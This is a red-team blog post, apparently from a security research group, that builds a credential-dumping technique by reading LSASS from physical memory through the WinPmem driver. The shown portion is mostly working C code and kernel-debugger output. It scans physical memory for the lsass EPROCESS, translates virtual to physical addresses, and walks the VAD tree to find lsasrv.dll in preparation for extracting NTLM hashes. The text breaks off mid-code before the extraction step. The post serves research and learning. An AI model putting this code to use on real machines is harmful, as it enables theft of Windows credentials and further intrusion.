---
title: "A physical graffiti of LSASS: getting credentials from physical memory for fun and learning"
date: 2021-05-08 00:00:00 +00:00
modified: 2021-05-08 00:00:00 +00:00
tags: [red team, research, mimikatz, SnoopyOwl, credentials, lsass, X-C3LL]
description: Dumping credentials from LSASS via physical memory in live machines
image: 
---

Dear Fell**owl**ship, today's homily is about how one of our owls began his own quest through the lands of physical memory to find the ~~credentials~~ keys to paradise. Please, take a seat and listen to the story.


# Prayers at the foot of the Altar a.k.a. disclaimer
*Our knowledge about the topic discussed in this article is limited, as we stated in the tittle we did this work just for __learning__ purposes. If you spot incorrections/misconceptions, please ping us at twitter so we can fix it. For a more accurate information (and deep explanations), please check the book "[Windows Internals](https://twitter.com/TheXC3LL/status/1366417199737548801)" (Pavel Yosifovich, Alex Ionescu, Mark E. Russinovich & David A. Solomon). Also well-known forensic tools are a good source of information (for example [Volatility](https://github.com/volatilityfoundation/volatility)).*

*Other important thing to keep in mind: the windows version used here is Windows 10 2009 20H2 (October 2020 Update).*

# Preamble
Hunting for juicy information inside dumps of physical memory is something that regular forensic tools do by default. Even cheaters have been exploring this way in the past to build wallhacks: read physical memory, find your desired game process and look for the player information structs.

From a Red Teaming/Pentesting optics, this approach has been explored too in order to obtain credentials from the lsass process in live machines during engagements. For example, in 2020 F-Secure published an article titled "[Rethinking credential theft](https://labs.f-secure.com/blog/rethinking-credential-theft/)" and released a tool called "[PhysMem2Profit](https://github.com/FSecureLABS/physmem2profit)". 

In their article/tool they use [WinPmem](https://github.com/Velocidex/WinPmem) driver to read physical memory (a vulnerable driver with a read primitive would work too), creating a bridge with sockets between the target machine and the pentester machine, so they can create a minidump of lsass process that is compatible with Mimikatz with the help of Rekall. 

<figure>
<img src="https://labs.f-secure.com/assets/Uploads/PhysmemBlog3.png" alt="Working schema (from 'Rethinking Credential Theft')">
<figcaption>
Working schema (from 'Rethinking Credential Theft')
</figcaption>
</figure>

The steps they follow are:
   1. Expose the physical memory of the target over a TCP port.
   2. Connect to the TCP port and mount the physical memory as a file.
   3. Analyze the mounted memory with the help of the Rekall framework and create a minidump of LSASS.
   4. Run the minidump through Mimikatz and retrieve credential material.

In our humble opinion, this approach is too convoluted and contains unnecessary steps. Also creating a socket between the two machines does not look fine to us. So... here comes our idea: let's try to loot lsass from physical memory staying in the same machine and WITHOUT externals tools (like they did with rekall). It is a good opportunity to learn new things!kd 

# It's dangerous to go alone! Take this.

As in any quest, we first need a __map__ and a __compass__ to find the treasure because the land of physical memory is dangerous and full of terrors. We can read arbitrary physical memory with WinPem or a driver vulnerable with a read primitive, but... How can we find the process memory? Well, our map is the AVL-tree that contains the VADs info and our compass is the EPROCESS struct. Let's explain this!

The Memory Manager needs to keep track of which virtual addresses have been reserved in the process' address space. This information is contained in structs called "[VAD](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/-vad)" (Virtual Address Descriptor) and they are placed inside an AVL-tree (an [AVL-tree](https://en.wikipedia.org/wiki/AVL_tree) is a self-balancing binary search tree). The tree is our map: if we find the tree's first node we can start to walk it and retrieve all the VADs, and consequently we would get the knowledge of how the process memory is distributed (also, the VAD provides more useful information as we are going to see later).

But... how can we find this tree? Well, we need the compass. And our compass is the **[EPROCESS](https://www.vergiliusproject.com/kernels/x64/Windows%2010%20%7C%202016/2009%2020H2%20(October%202020%20Update)/_EPROCESS)**. This structure contains a pointer to the tree (field **VadRoot**) and the number of nodes (**VadCount**):

```c
//0xa40 bytes (sizeof)
struct _EPROCESS
{
    struct _KPROCESS Pcb;                                                   //0x0
    struct _EX_PUSH_LOCK ProcessLock;                                       //0x438
    VOID* UniqueProcessId;                                                  //0x440
    struct _LIST_ENTRY ActiveProcessLinks;                                  //0x448
    struct _EX_RUNDOWN_REF RundownProtect;                                  //0x458
//(...)
    struct _RTL_AVL_TREE VadRoot;                                           //0x7d8
    VOID* VadHint;                                                          //0x7e0
    ULONGLONG VadCount;                                                     //0x7e8
//(...)
```


Finding this structure in physical memory is easy. In the article "[CVE-2019-8372: Local Privilege Elevation in LG Kernel Driver](http://jackson-t.ca/lg-driver-lpe.html)", [@Jackson_T](https://twitter.com/Jackson_T) uses a mask to find this structure. As we know some data (like the PID, the process name or the *Priority* value) we can use this as a signature and search the whole physical memory until we match it.

> We'll know the name and PID for each process we're targeting, so the UniqueProcessId and ImageFileName fields should be good candidates. Problem is that we won't be able to accurately predict the values for every field between them. Instead, we can define two needles: one that has ImageFileName and another that has UniqueProcessId. We can see that their corresponding byte buffers have predictable outputs. (From Jackson_T post)


So, we can search for our masks and then apply relative offsets to read the fields that we are interested in:

```c
int main(int argc, char** argv) {
    WINPMEM_MEMORY_INFO info;
    DWORD size;
    BOOL result = FALSE;
    int i = 0;
    LARGE_INTEGER large_start;
    DWORD found = 0;


    printf("[+] Getting WinPmem handle...\t");
    pmem_fd = CreateFileA("\\\\.\\pmem",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);
    if (pmem_fd == INVALID_HANDLE_VALUE) {
        printf("ERROR!\n");
        return -1;
    }
    printf("OK!\n");

    RtlZeroMemory(&info, sizeof(WINPMEM_MEMORY_INFO));
    printf("[+] Getting memory info...\t");
    result = DeviceIoControl(pmem_fd, IOCTL_GET_INFO,
        NULL, 0, // in
        (char*)&info, sizeof(WINPMEM_MEMORY_INFO), // out
        &size, NULL);
    if (!result) {
        printf("ERROR!\n");
        return -1;
    }
    printf("OK!\n");

    printf("[+] Memory Info:\n");
    printf("\t[-] Total ranges: %lld\n", info.NumberOfRuns.QuadPart);
    for (i = 0; i < info.NumberOfRuns.QuadPart; i++) {
        printf("\t\tStart 0x%08llX - Length 0x%08llx\n", info.Run[i].BaseAddress.QuadPart, info.Run[i].NumberOfBytes.QuadPart);
        max_physical_memory = info.Run[i].BaseAddress.QuadPart + info.Run[i].NumberOfBytes.QuadPart;
    }
    printf("\t[-] Max physical memory 0x%08llx\n", max_physical_memory);

    printf("[+] Scanning memory... ");
    
   
    for (i = 0; i < info.NumberOfRuns.QuadPart; i++) {
        start = info.Run[i].BaseAddress.QuadPart;
        end = info.Run[i].BaseAddress.QuadPart + info.Run[i].NumberOfBytes.QuadPart;

        while (start < end) {
            unsigned char* largebuffer = (unsigned char*)malloc(BUFF_SIZE);
            DWORD to_write = (DWORD)min((BUFF_SIZE), end - start);
            DWORD bytes_read = 0;
            DWORD bytes_written = 0;
            large_start.QuadPart = start;
            result = SetFilePointerEx(pmem_fd, large_start, NULL, FILE_BEGIN);
            if (!result) {
                printf("[!] ERROR! (SetFilePointerEx)\n");
            }
            result = ReadFile(pmem_fd, largebuffer, to_write, &bytes_read, NULL);
            EPROCESS_NEEDLE needle_root_process = {"lsass.exe"};
            
            PBYTE needle_buffer = (PBYTE)malloc(sizeof(EPROCESS_NEEDLE));
            memcpy(needle_buffer, &needle_root_process, sizeof(EPROCESS_NEEDLE));
            int offset = 0;
            offset = memmem((PBYTE)largebuffer, bytes_read, needle_buffer, sizeof(EPROCESS_NEEDLE)); // memmem() is the same used by Jackson_T in his post    
            if (offset >= 0) {
                if (largebuffer[offset + 15] == 2) { //Priority Check
                    if (largebuffer[offset - 0x168] == 0x70 && largebuffer[offset - 0x167] == 0x02) { //PID check, hardcoded for PoC, we can take in runtime but... too lazy :P
                        printf("signature match at 0x%08llx!\n", offset + start);
                        printf("[+] EPROCESS is at 0x%08llx [PHYSICAL]\n", offset - 0x5a8 + start);
                        memcpy(&DirectoryTableBase, largebuffer + offset - 0x5a8 + 0x28, sizeof(ULONGLONG));
                        printf("\t[*] DirectoryTableBase: 0x%08llx\n", DirectoryTableBase);
                        printf("\t[*] VadRoot is at 0x%08llx [PHYSICAL]\n", start + offset - 0x5a8 + 0x7d8);
                        memcpy(&VadRootPointer, largebuffer + offset - 0x5a8 + 0x7d8, sizeof(ULONGLONG));
                        VadRootPointer = VadRootPointer;
                        printf("\t[*] VadRoot points to 0x%08llx [VIRTUAL]\n", VadRootPointer);
                        memcpy(&VadCount, largebuffer + offset - 0x5a8 + 0x7e8, sizeof(ULONGLONG));
                        printf("\t[*] VadCount is %lld\n", VadCount);
                        free(needle_buffer);
                        free(largebuffer);
                        found = 1;
                        break;
                    }
                }
            }

            start += bytes_read;

            free(needle_buffer);
            free(largebuffer);
        }
        if (found != 0) {
            break;
        }
    }
    
	return 0;
}
```

And here is the ouput:

```
[+] Getting WinPmem handle...   OK!
[+] Getting memory info...      OK!
[+] Memory Info:
        [-] Total ranges: 4
                Start 0x00001000 - Length 0x0009e000
                Start 0x00100000 - Length 0x00002000
                Start 0x00103000 - Length 0xdfeed000
                Start 0x100000000 - Length 0x20000000
        [-] Max physical memory 0x120000000
[+] Scanning memory... signature match at 0x271c3628!
[+] EPROCESS is at 0x271c3080 [PHYSICAL]
        [*] DirectoryTableBase: 0x29556000
        [*] VadRoot is at 0x271c3858 [PHYSICAL]
        [*] VadRoot points to 0xffffa48bb0147290 [VIRTUAL]
        [*] VadCount is 165
```


Maybe you are wondering why are we interested in the field **DirectoryTableBase**. The thing is: from our point of view we only can work with physical memory, we do not "understand" what a virtual address is because to us they are "out of context". We know about physical memory and offsets, not about virtual addresses bounded to a process. But we are going to deal with pointers to virtual memory so... we need a way to translate them.

# Lost in translation 
I like to compare virtual addresses with the code used in libraries to know the location of a book, where the first digits indicates the hall, the next the bookshelf, the column and finally the shelf where the book lies.

Our virtual address is in some way just like the library code: it contains different indexes. Instead of talking about halls, columns or shelves, we have **Page-Map-Level4** (PML4E), **Page-Directory-Pointer** (PDPE), **Page-Directory** (PDE), **Page-Table** (PTE) and the **Page Physical Offset**. 

<figure>
<img src="https://connormcgarr.github.io/images/PAGE_2.png" alt="From AMD64 Architecture Programmer’s Manual Volume 2.">
<figcaption>
From  AMD64 Architecture Programmer’s Manual Volume 2.
</figcaption>
</figure>

Those are the page levels for a 4KB page, for 2MB we have PML4E, PDPE, PDE and the offset. We can verify this information using kd and the command **[!vtop](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/-vtop)** with different processes:

For 4KB (Base 0x26631000, virtual adress to translate 0xffffc987034fd330):
```
lkd> !vtop 26631000 0xffffc987034fd330
Amd64VtoP: Virt ffffc987034fd330, pagedir 0000000026631000
Amd64VtoP: PML4E 0000000026631c98
Amd64VtoP: PDPE 00000000046320e0
Amd64VtoP: PDE 0000000100a1c0d0
Amd64VtoP: PTE 000000001fa3f7e8
Amd64VtoP: Mapped phys 0000000026da8330
Virtual address ffffc987034fd330 translates to physical address 26da8330.
```

For 2MB (Base 0x1998D000, virtual address to translate 0xffffaa83f4b35640):
```
lkd> !vtop 1998D000 ffffaa83f4b35640
Amd64VtoP: Virt ffffaa83f4b35640, pagedir 000000001998d000
Amd64VtoP: PML4E 000000001998daa8
Amd64VtoP: PDPE 0000000004631078
Amd64VtoP: PDE 0000000004734d28
Amd64VtoP: Large page mapped phys 0000000108d35640
Virtual address ffffaa83f4b35640 translates to physical address 108d35640.
```

What is it doing under the hood? Well, the picture of a 4KB page follows this explanation: if you turn the virtual address to its binary representation, you can split it into the indexes of each page level. So, imagine we want to translate the virtual address `0xffffa48bb0147290` and the process page base is `0x29556000` (let's assume is a 4kb page, later we will explain how to know it). 

```
lkd> .formats ffffa48bb0147290
Evaluate expression:
  Hex:     ffffa48b`b0147290
  Decimal: -100555115171184
  Octal:   1777775110566005071220
  Binary:  11111111 11111111 10100100 10001011 10110000 00010100 01110010 10010000
  Chars:   ......r.
  Time:    ***** Invalid FILETIME
  Float:   low -5.40049e-010 high -1.#QNAN
  Double:  -1.#QNAN
```

Now we can split the bits in chunks: 12 bits for the Page Physical Offset, 9 for the PTE, 9 for the PDE, 9 for the PDPE and 9 for the PML4E:
```
1111111111111111 101001001 000101110 110000000 101000111 001010010000
```

Next we are going to take the chunk for PML4E and multiply by 0x8:

```
lkd> .formats 0y101001001
Evaluate expression:
  Hex:     00000000`00000149
  Decimal: 329
  Octal:   0000000000000000000511
  Binary:  00000000 00000000 00000000 00000000 00000000 00000000 00000001 01001001
  Chars:   .......I
  Time:    Thu Jan  1 01:05:29 1970
  Float:   low 4.61027e-043 high 0
  Double:  1.62548e-321

0x149 * 0x8 = 0xa48
```

Now we can use it as an offset: just add this value to the page base (`0x29556a48`). Next, read the physical memory at that location:

```
lkd> !dq 29556a48
#29556a48 0a000000`04632863 00000000`00000000
#29556a58 00000000`00000000 00000000`00000000
#29556a68 00000000`00000000 00000000`00000000
#29556a78 00000000`00000000 00000000`00000000
#29556a88 00000000`00000000 00000000`00000000
#29556a98 00000000`00000000 00000000`00000000
#29556aa8 00000000`00000000 00000000`00000000
#29556ab8 00000000`00000000 00000000`00000000
```

Turn to zero the last 3 numbers, so we have `0x4632000`. Now repeat the operation of multiplying the chunk of bits:
```
kd> .formats 0y000101110
Evaluate expression:
  Hex:     00000000`0000002e
  Decimal: 46
  Octal:   0000000000000000000056
  Binary:  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00101110
  Chars:   ........
  Time:    Thu Jan  1 01:00:46 1970
  Float:   low 6.44597e-044 high 0
  Double:  2.2727e-322
```
So... `0x4632000 + (0x2e * 0x8) == 0x4632170`. Read the physical memory at this point:

```
lkd> !dq 4632170
# 4632170 0a000000`04735863 00000000`00000000
# 4632180 00000000`00000000 00000000`00000000
# 4632190 00000000`00000000 00000000`00000000
# 46321a0 00000000`00000000 00000000`00000000
# 46321b0 00000000`00000000 00000000`00000000
# 46321c0 00000000`00000000 00000000`00000000
# 46321d0 00000000`00000000 00000000`00000000
# 46321e0 00000000`00000000 00000000`00000000
```


Just repeat the same operation until the end (except for the last 12 bits, those don't need to be multiplied by 0x8) and you have successfully translated your virtual address! Don't trust me? Check it!

```
kd> !vtop 0x29556000 0xffffa48bb0147290
Amd64VtoP: Virt ffffa48bb0147290, pagedir 0000000029556000
Amd64VtoP: PML4E 0000000029556a48
Amd64VtoP: PDPE 0000000004632170
Amd64VtoP: PDE 0000000004735c00
Amd64VtoP: PTE 0000000022246a38
Amd64VtoP: Mapped phys 000000001645b290
Virtual address ffffa48bb0147290 translates to physical address 1645b290.
```

Ta-dá!


Here is a sample function that we are going to use to translate virtual addresses (4Kb and 2Mb) to physical (ugly as hell, but works):

```c
ULONGLONG v2p(ULONGLONG vaddr) {
    BOOL result = FALSE;
    DWORD bytes_read = 0;
    LARGE_INTEGER PML4E;
    LARGE_INTEGER PDPE;
    LARGE_INTEGER PDE;
    LARGE_INTEGER PTE;
    ULONGLONG SIZE = 0;
    ULONGLONG phyaddr = 0;
    ULONGLONG base = 0;

    base = DirectoryTableBase;

    PML4E.QuadPart = base + extractBits(vaddr, 9, 39) * 0x8;
    //printf("[DEBUG Virtual Address: 0x%08llx]\n", vaddr);
    //printf("\t[*] PML4E: 0x%x\n", PML4E.QuadPart);

    result = SetFilePointerEx(pmem_fd, PML4E, NULL, FILE_BEGIN);
    PDPE.QuadPart = 0;
    result = ReadFile(pmem_fd, &PDPE.QuadPart, 7, &bytes_read, NULL);
    PDPE.QuadPart = extractBits(PDPE.QuadPart, 56, 12) * 0x1000 + extractBits(vaddr, 9, 30) * 0x8;
    //printf("\t[*] PDPE: 0x%08llx\n", PDPE.QuadPart);

    result = SetFilePointerEx(pmem_fd, PDPE, NULL, FILE_BEGIN);
    PDE.QuadPart = 0;
    result = ReadFile(pmem_fd, &PDE.QuadPart, 7, &bytes_read, NULL);
    PDE.QuadPart = extractBits(PDE.QuadPart, 56, 12) * 0x1000 + extractBits(vaddr, 9, 21) * 0x8;
    //printf("\t[*] PDE: 0x%08llx\n", PDE.QuadPart);


    result = SetFilePointerEx(pmem_fd, PDE, NULL, FILE_BEGIN);
    PTE.QuadPart = 0;
    result = ReadFile(pmem_fd, &SIZE, 8, &bytes_read, NULL);
    if (extractBits(SIZE, 1, 63) == 1) {
        result = SetFilePointerEx(pmem_fd, PDE, NULL, FILE_BEGIN);
        result = ReadFile(pmem_fd, &phyaddr, 7, &bytes_read, NULL);
        phyaddr = extractBits(phyaddr, 56, 20) * 0x100000 + extractBits(vaddr, 21, 0);
        //printf("\t[*] Physical Address: 0x%08llx\n", phyaddr);
        return phyaddr;

     }


    result = SetFilePointerEx(pmem_fd, PDE, NULL, FILE_BEGIN);
    PTE.QuadPart = 0;
    result = ReadFile(pmem_fd, &PTE.QuadPart, 7, &bytes_read, NULL);
    PTE.QuadPart = extractBits(PTE.QuadPart, 56, 12) * 0x1000 + extractBits(vaddr, 9, 12) * 0x8;
    //printf("\t[*] PTE: 0x%08llx\n", PTE.QuadPart);

    result = SetFilePointerEx(pmem_fd, PTE, NULL, FILE_BEGIN);
    result = ReadFile(pmem_fd, &phyaddr, 7, &bytes_read, NULL);
    phyaddr = extractBits(phyaddr, 56, 12) * 0x1000 + extractBits(vaddr, 12, 0);
    //printf("\t[*] Physical Address: 0x%08llx\n", phyaddr);
    
    return phyaddr;
}
```

Well, now we can work with virtual addresses. Let's move!


# Lovin' Don't Grow On Trees

The next task to solve is to walk the AVL tree and extract all the VADs.  Let's check the VadRoot pointer:


```
lkd> dq ffffa48bb0147290
ffffa48b`b0147290  ffffa48b`b0146c50 ffffa48b`b01493b0
ffffa48b`b01472a0  00000000`00000001 ff643ab1`ff643aa0
ffffa48b`b01472b0  00000000`00000707 00000000`00000000
ffffa48b`b01472c0  00000003`000003a0 00000000`00000000
ffffa48b`b01472d0  00000000`04000000 ffffa48b`b014daa0
ffffa48b`b01472e0  ffffd100`10b56f40 ffffd100`10b56fc8
ffffa48b`b01472f0  ffffa48b`b014da28 ffffa48b`b014da28
ffffa48b`b0147300  ffffa48b`b016e081 00007ff6`43aa5002
```

The first thing we can see is the pointer to the left node (offset 0x00-0x07) and the pointer to the right node (0x08-0x10). We have to add them to a queue and check them later, and add their respective new children nodes, repeating this operation in order to walk the whole tree. Also combining 4 bytes from 0x18 and 1 byte from 0x20 we get the starting address of the described memory region (the ending virtual addrees is obtained combining 4 bytes from 0x1c and 1 byte from 0x21). So we can walk the whole tree doing something like:

```c
//(...)
	currentNode = queue[cursor]; // Current Node, at start it is the VadRoot pointer
        if (currentNode == 0) {
            cursor++;
            continue;
        }

        reader.QuadPart = v2p(currentNode); // Get Physical Address
        left = readPhysMemPointer(reader); //Read 8 bytes and save it as "left" node
        queue[last++] = left; //Add the new node
        //printf("[<] Left: 0x%08llx\n", left);

        reader.QuadPart = v2p(currentNode + 0x8); // Get Physical Address of right node
        right = readPhysMemPointer(reader); //Save the pointer
        queue[last++] = right; //Add the new node
        //printf("[>] Right: 0x%08llx\n", right);
  



        // Get the start address
        reader.QuadPart = v2p(currentNode + 0x18);
        result = SetFilePointerEx(pmem_fd, reader, NULL, FILE_BEGIN);
        result = ReadFile(pmem_fd, &startingVpn, 4, &bytes_read, NULL);
        reader.QuadPart = v2p(currentNode + 0x20);
        result = SetFilePointerEx(pmem_fd, reader, NULL, FILE_BEGIN);
        result = ReadFile(pmem_fd, &startingVpnHigh, 1, &bytes_read, NULL);
        start = (startingVpn << 12) | (startingVpnHigh << 44);

        // Get the end address
        reader.QuadPart = v2p(currentNode + 0x1c);
        result = SetFilePointerEx(pmem_fd, reader, NULL, FILE_BEGIN);
        result = ReadFile(pmem_fd, &endingVpn, 4, &bytes_read, NULL);
        reader.QuadPart = v2p(currentNode + 0x21);
        result = SetFilePointerEx(pmem_fd, reader, NULL, FILE_BEGIN);
        result = ReadFile(pmem_fd, &endingVpnHigh, 1, &bytes_read, NULL);
        end = (((endingVpn + 1) << 12) | (endingVpnHigh << 44));
//(...)
```

Now we can retrieve all the regions of virtual memory reserved, and the limits (starting address and ending address, and by substraction the size):

```
[+] Starting to walk _RTL_AVL_TREE...
                ===================[VAD info]===================
[0] (0xffffa48bb0147290) [0x7ff643aa0000-0x7ff643ab2000] (73728 bytes)
[1] (0xffffa48bb0146c50) [0x1d4d2ef0000-0x1d4d2f0d000] (118784 bytes)
[2] (0xffffa48bb01493b0) [0x7ff845000000-0x7ff845027000] (159744 bytes)
[3] (0xffffa48bb0179300) [0x80cbf00000-0x80cbf80000] (524288 bytes)
[4] (0xffffa48bb01795d0) [0x1d4d36a0000-0x1d4d36a1000] (4096 bytes)
[5] (0xffffa48bb01a1390) [0x7ff844540000-0x7ff84454c000] (49152 bytes)
```

But VADs contains other interesting metadata. For example, if the region is reserved for a image file, we can retrieve the path of that file. This is important for us because we want to locate the loaded lsasrv.dll inside the lsass process because from here is where we are going to loot credentials (imitating the Mimikatz's `sekurlsa::msv` to get NTLM hashes). 

Let's take a ride through the `__mmvad` struct (follow the arrows!):

```
lkd> dt nt!_mmvad 0xffffe786`ed185cf0
   +0x000 Core             : _MMVAD_SHORT
   +0x040 u2               : <anonymous-tag>
   +0x048 Subsection       : 0xffffe786`ed185d60 _SUBSECTION <===========
   +0x050 FirstPrototypePte : (null)
   +0x058 LastContiguousPte : 0x00000002`00000006 _MMPTE
   +0x060 ViewLinks        : _LIST_ENTRY [ 0x00000006`00000029 - 0x00000000`00000000 ]
   +0x070 VadsProcess      : 0xffffe786`ed185c70 _EPROCESS
   +0x078 u4               : <anonymous-tag>
   +0x080 FileObject       : 0xffffe786`ed185d98 _FILE_OBJECT



kd> dt nt!_SUBSECTION 0xffffe786`ed185d60
   +0x000 ControlArea      : 0xffffe786`ed185c70 _CONTROL_AREA <==============================
   +0x008 SubsectionBase   : 0xffffae0e`cab53f58 _MMPTE
   +0x010 NextSubsection   : 0xffffe786`ed185d98 _SUBSECTION
   +0x018 GlobalPerSessionHead : _RTL_AVL_TREE
   +0x018 CreationWaitList : (null)
   +0x018 SessionDriverProtos : (null)
   +0x020 u                : <anonymous-tag>
   +0x024 StartingSector   : 0x2b
   +0x028 NumberOfFullSectors : 0x2c
   +0x02c PtesInSubsection : 6
   +0x030 u1               : <anonymous-tag>
   +0x034 UnusedPtes       : 0y000000000000000000000000000000 (0)
   +0x034 ExtentQueryNeeded : 0y0
   +0x034 DirtyPages       : 0y0



lkd> dt nt!_CONTROL_AREA  0xffffe786`ed185c70
   +0x000 Segment          : 0xffffae0e`ce0c9f50 _SEGMENT
   +0x008 ListHead         : _LIST_ENTRY [ 0xffffe786`ed1b1210 - 0xffffe786`ed1b1210 ]
   +0x008 AweContext       : 0xffffe786`ed1b1210 Void
   +0x018 NumberOfSectionReferences : 1
   +0x020 NumberOfPfnReferences : 0xf
   +0x028 NumberOfMappedViews : 1
   +0x030 NumberOfUserReferences : 2
   +0x038 u                : <anonymous-tag>
   +0x03c u1               : <anonymous-tag>
   +0x040 FilePointer      : _EX_FAST_REF <=================
   +0x048 ControlAreaLock  : 0n0
   +0x04c ModifiedWriteCount : 0
   +0x050 WaitList         : (null)
   +0x058 u2               : <anonymous-tag>
   +0x068 FileObjectLock   : _EX_PUSH_LOCK
   +0x070 LockedPages      : 1
   +0x078 u3               : <anonymous-tag>

```

So at `0xffffe786ed185c70` plus 0x40 we have a field called **FilePointer** and it is an `EX_FAST_REF`. In order to retrieve the correct pointer, we have to retrieve the pointer from this position and turn to zero the last digit:

```
lkd> dt nt!_EX_FAST_REF 0xffffe786`ed185c70+0x40
   +0x000 Object           : 0xffffe786`ed19539c Void <=========================== & 0xfffffffffffffff0
   +0x000 RefCnt           : 0y1100
   +0x000 Value            : 0xffffe786`ed19539c
```

So `0xffffe786ed19539c & 0xfffffffffffffff0` is `0xffffe786ed195390`, which is a pointer to a `_FILE_OBJECT` struct:

```
lkd> dt nt!_FILE_OBJECT 0xffffe786`ed195390
   +0x000 Type             : 0n5
   +0x002 Size             : 0n216
   +0x008 DeviceObject     : 0xffffe786`e789c060 _DEVICE_OBJECT
   +0x010 Vpb              : 0xffffe786`e77df4c0 _VPB
   +0x018 FsContext        : 0xffffae0e`cd2c8170 Void
   +0x020 FsContext2       : 0xffffae0e`cd2c83e0 Void
   +0x028 SectionObjectPointer : 0xffffe786`ed18e7f8 _SECTION_OBJECT_POINTERS
   +0x030 PrivateCacheMap  : (null)
   +0x038 FinalStatus      : 0n0
   +0x040 RelatedFileObject : (null)
   +0x048 LockOperation    : 0 ''
   +0x049 DeletePending    : 0 ''
   +0x04a ReadAccess       : 0x1 ''
   +0x04b WriteAccess      : 0 ''
   +0x04c DeleteAccess     : 0 ''
   +0x04d SharedRead       : 0x1 ''
   +0x04e SharedWrite      : 0 ''
   +0x04f SharedDelete     : 0x1 ''
   +0x050 Flags            : 0x44042
   +0x058 FileName         : _UNICODE_STRING "\Windows\System32\lsass.exe"  <======== /!\
   +0x068 CurrentByteOffset : _LARGE_INTEGER 0x0
   +0x070 Waiters          : 0
   +0x074 Busy             : 0
   +0x078 LastLock         : (null)
   +0x080 Lock             : _KEVENT
   +0x098 Event            : _KEVENT
   +0x0b0 CompletionContext : (null)
   +0x0b8 IrpListLock      : 0
   +0x0c0 IrpList          : _LIST_ENTRY [ 0xffffe786`ed195450 - 0xffffe786`ed195450 ]
   +0x0d0 FileObjectExtension : (null)
```

Finally! At offset 0x58 is an `_UNICODE_STRING` struct that contains the path to the image asociated with this memory region. In order to get this info, we need to parse each node found and get deep in this rollercoaster of structs, reading each pointer from the target offset. So... finally we are going to have something like:

```c
void walkAVL(ULONGLONG VadRoot, ULONGLONG VadCount) {

    /* Variables used to walk the AVL tree*/
    ULONGLONG* queue;
    BOOL result;
    DWORD bytes_read = 0;
    LARGE_INTEGER reader;
    ULONGLONG cursor = 0;
    ULONGLONG count = 1;
    ULONGLONG last = 1;

    ULONGLONG startingVpn = 0;
    ULONGLONG endingVpn = 0;
    ULONGLONG startingVpnHigh = 0;
    ULONGLONG endingVpnHigh = 0;
    ULONGLONG start = 0;
    ULONGLONG end = 0;

    VAD* vadList = NULL;



    printf("[+] Starting to walk _RTL_AVL_TREE...\n");
    queue = (ULONGLONG *)malloc(sizeof(ULONGLONG) * VadCount * 4); // Make room for our queue
    queue[0] = VadRoot; // Node 0

    vadList = (VAD*)malloc(VadCount * sizeof(*vadList)); // Save all the VADs in an array. We do not really need it (because we can just break when the lsasrv.dll is found) but hey... maybe we want to reuse this code in the future

    while (count <= VadCount) {
        ULONGLONG currentNode;
        ULONGLONG left = 0;
        ULONGLONG right = 0;
        ULONGLONG subsection = 0;
        ULONGLONG control_area = 0;
        ULONGLONG filepointer = 0;
        ULONGLONG fileobject = 0;
        ULONGLONG filename = 0;
        USHORT pathLen = 0;
        LPWSTR path = NULL;
        

        // printf("Cursor [%lld]\n", cursor);
        currentNode = queue[cursor]; // Current Node, at start it is the VadRoot pointer
        if (currentNode == 0) {
            cursor++;
            continue;
        }

        reader.QuadPart = v2p(currentNode); // Get Physical Address
        left = readPhysMemPointer(reader); //Read 8 bytes and save it as "left" node
        queue[last++] = left; //Add the new node
        //printf("[<] Left: 0x%08llx\n", left);

        reader.QuadPart = v2p(currentNode + 0x8); // Get Physical Address of right node
        right = readPhysMemPointer(reader); //Save the pointer
        queue[last++] = right; //Add the new node
        //printf("[>] Right: 0x%08llx\n", right);
  



        // Get the start address
        reader.QuadPart = v2p(currentNode + 0x18);
        result = SetFilePointerEx(pmem_fd, reader, NULL, FILE_BEGIN);
        result = ReadFile(pmem_fd, &startingVpn, 4, &bytes_read, NULL);
        reader.QuadPart = v2p(currentNode + 0x20);
        result = SetFilePointerEx(pmem_fd, reader, NULL, FILE_BEGIN);
        result = ReadFile(pmem_fd, &startingVpnHigh, 1, &bytes_read, NULL);
        start = (startingVpn << 12) | (startingVpnHigh << 44);

        // Get the end address
        reader.QuadPart = v2p(currentNode + 0x1c);
        result = SetFilePointerEx(pmem_fd, reader, NULL, FILE_BEGIN);
        result = ReadFile(pmem_fd, &endingVpn, 4, &bytes_read, NULL);
        reader.QuadPart = v2p(currentNode + 0x21);
        result = SetFilePointerEx(pmem_fd, reader, NULL, FILE_BEGIN);
        result = ReadFile(pmem_fd, &endingVpnHigh, 1, &bytes_read, NULL);
        end = (((endingVpn + 1) << 12) | (endingVpnHigh << 44));

        //Get the pointer to Subsection (offset 0x48 of __mmvad)
        reader.QuadPart = v2p(currentNode + 0x48);
        subsection = readPhysMemPointer(reader); 
        
        if (subsection != 0 && subsection != 0xffffffffffffffff) {

            //Get the pointer to ControlArea (offset 0 of _SUBSECTION)
            reader.QuadPart = v2p(subsection);
            control_area = readPhysMemPointer(reader); 

            if (control_area != 0 && control_area != 0xffffffffffffffff) {

                //Get the pointer to FileObject (offset 0x40 of _CONTROL_AREA)
                reader.QuadPart = v2p(control_area + 0x40);
                fileobject = readPhysMemPointer(reader);
                if (fileobject != 0 && fileobject != 0xffffffffffffffff) {
                    // It is an _EX_FAST_REF, so we need to mask the last byte
                    fileobject = fileobject & 0xfffffffffffffff0;

                    //Get the pointer to path length (offset 0x58 of _FILE_OBJECT is _UNICODE_STRING, the len plus null bytes is at +0x2)
                    reader.QuadPart = v2p(fileobject + 0x58 + 0x2);
                    result = SetFilePointerEx(pmem_fd, reader, NULL, FILE_BEGIN);
                    result = ReadFile(pmem_fd, &pathLen, 2, &bytes_read, NULL);

                    //Get the pointer to the path name (offset 0x58 of _FILE_OBJECT is _UNICODE_STRING, the pointer to the buffer is +0x08)
                    reader.QuadPart = v2p(fileobject + 0x58 + 0x8);
                    filename = readPhysMemPointer(reader);

                    //Save the path name
                    path = (LPWSTR)malloc(pathLen * sizeof(wchar_t));
                    reader.QuadPart = v2p(filename);
                    result = SetFilePointerEx(pmem_fd, reader, NULL, FILE_BEGIN);
                    result = ReadFile(pmem_fd, path, pathLen * 2, &bytes_read, NULL);
                }
            }
        }
        /*printf("[0x%08llx]\n", currentNode);
        printf("[!] Subsection 0x%08llx\n", subsection);
        printf("[!] ControlArea 0x%08llx\n", control_area);
        printf("[!] FileObject 0x%08llx\n", fileobject);
